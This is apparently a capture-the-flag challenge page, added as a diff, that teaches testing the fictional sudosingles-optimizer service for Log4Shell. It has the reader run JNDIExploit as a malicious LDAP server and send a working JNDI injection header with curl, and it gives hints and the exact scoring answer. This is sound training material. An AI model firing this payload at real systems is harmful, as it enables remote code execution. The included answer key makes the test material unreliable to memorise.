@@ -1,0 +1,99 @@
+# Task 4: Preparing the Way 🔬
+
+## DESCRIPTION
+
+Looks like the attacker has been using JNDIExploit in your environment! That means they were likely trying to exploit log4j. That’s bad news, especially since you know the SudoSingles™ image optimization microservice is written in Java and uses log4j.
+
+You need to figure out if the <code>sudosingles-optimizer</code> service is vulnerable to the log4shell exploit. Now.
+
+A quick and efficient way to figure out if you’re vulnerable is to try to do the exploit yourself. (Maybe not the most secure way, though, so don’t try this at home.)
+
+## DETAILS
+
+So, you're going to use JNDIExploit to see if <code>sudosingles-optimizer</code> is vulnerable. This challenge has many parts, so go through each one carefully.
+
+If you’re not already aware, JNDIExploit is a tool that sets up a malicious LDAP server that can be used to execute arbitrary commands on a host running an application vulnerable to the log4shell exploit.
+
+TLDR; you’re going to trick <code>sudosingles-optimizer</code> into connecting to a malicious server so you can run whatever commands we want inside its container.
+
+You have to set up the server first. To do this, do the following:
+
+    Open the Terminal Emulator application from the dock on the bottom.
+
+    Navigate to the hacker folder by running “cd /config/Desktop/hacker”
+
+    Find your private ip address on the LAN network. There are many ways to find your IP address on Linux – I'll leave this one to you. Just make sure you write it down. The IP you find should look something like 10.0.XX.XX or 10.0.XX.XXX
+
+    Run the JNDIExploit-1.2-SNAPSHOT.jar file using Java, configuring it to start the malicious server listening on the private IP address you found in step 3 above.
+
+If you see something like the below, you’re on the right track:
+
+<pre> 
+
+<code> 
+
+[+] LDAP Server Start Listening on 1389... 
+
+[+] HTTP Server Start Listening on 9001... 
+
+</code> 
+
+</pre>
+
+To test to make sure it’s running correctly, <i>open another Terminal Emulator window</i> and run the following command, where YOURIP is your local IP: <code>curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'</code>
+
+To complete this challenge, after you run the above command, enter the last line generated in the Terminal Emulator window where JNDIExploit is running, and hit “Submit.” If your answer doesn’t submit, double-check all the above steps. It could mean that something is wrong with the server command.
+
+## NOTES
+
+For the answer, enter the whole line, exactly as it appears in your terminal.
+
+The answer will look something like this (fill in the blanks):
+
+<pre> 
+
+<code> 
+
+[+] _______ ______: ___ 
+
+</code> 
+
+</pre>
+
+(I know it’s annoying, I just want to be sure you’ve set this up correctly, or things will be even more annoying later.)
+
+## SCORING
+
+String answer:
+
+[+] Response code: 200
+
+## HINTS
+
+### HINT 1
+
+To find your IP address, you can run many commands in the Linux terminal. Maybe there’s some way to use the hostname command to get what you want?
+
+If you’re having trouble with JNDIExploit, maybe try looking at the <code>-h</code> flag?
+
+### HINT 2
+
+<code>hostname -I</code> will give you your private IP address.
+
+<code>java –jar JNDIExploit-1.2-SNAPSHOT.jar -i PRIVATEIPADDRESS</code> will start the server properly.
+
+Triple-check to make sure you’re using that IP address.
+
+The answer is the <i>whole last line</i> from the Terminal window where you first ran the JNDIExploit program. Punctuation and all.
+
+### HINT 3
+
+1. Open a Terminal Emulator window
+
+2. Run <code>hostname -I</code> to get your ip address
+
+3. Run <code>java –jar JNDIExploit-1.2-SNAPSHOT.jar -i YOURIP</code>
+
+4. Open another window and run <code>curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'</code>
+
+5. If you are successful, you should see a line that looks like the following show up in your original terminal window: <code>[+] Response code: 200</code>
